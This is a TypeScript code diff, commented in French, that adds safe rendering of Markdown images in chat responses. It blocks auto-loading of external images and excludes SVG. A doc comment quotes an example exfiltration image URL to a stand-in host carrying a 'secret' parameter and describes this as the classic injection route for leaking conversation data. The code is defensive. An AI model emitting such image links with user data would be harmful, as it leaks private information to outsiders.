@@ -55,3 +55,39 @@ export function linkTarget<F extends LinkableFile>(href: string | undefined, tex
 
   return { kind: "text" };
 }
+
+const IMAGE_EXTENSIONS = new Set(["png", "jpg", "jpeg", "gif", "webp", "bmp", "avif"]);
+
+/** Image affichable en ligne. SVG exclu : un SVG peut embarquer des scripts. */
+export const isImageName = (name: string): boolean => IMAGE_EXTENSIONS.has(extension(name));
+
+/**
+ * Cible d'une image Markdown (« ![légende](src) ») dans une réponse. Une image externe n'est JAMAIS chargée
+ * automatiquement : son adresse peut porter des données (« ![](https://x.example/?secret=…) » est le moyen classique
+ * de faire sortir une information d'une conversation par injection). Seule une pièce jointe de ce message s'affiche.
+ */
+export type ImageTarget<F extends LinkableFile> =
+  | { kind: "image"; file: F }
+  | { kind: "file"; file: F }
+  | { kind: "link"; href: string }
+  | { kind: "text" };
+
+export function imageTarget<F extends LinkableFile>(src: string | undefined, alt: string, files: readonly F[]): ImageTarget<F> {
+  const target = linkTarget(src, alt, files);
+  if (target.kind === "file") return isImageName(target.file.name) ? { kind: "image", file: target.file } : { kind: "file", file: target.file };
+  if (target.kind === "external") return { kind: "link", href: target.href };
+  return { kind: "text" };
+}
+
+/**
+ * Noms (en minuscules) des pièces jointes déjà affichées EN LIGNE par une image Markdown du texte : la galerie d'images
+ * sous la réponse ne les répète pas.
+ */
+export function inlineImageNames<F extends LinkableFile>(markdown: string, files: readonly F[]): Set<string> {
+  const names = new Set<string>();
+  for (const match of markdown.matchAll(/!\[([^\]]*)\]\(\s*<?([^)\s>]+)/g)) {
+    const target = imageTarget(match[2], match[1], files);
+    if (target.kind === "image") names.add(fold(target.file.name));
+  }
+  return names;
+}
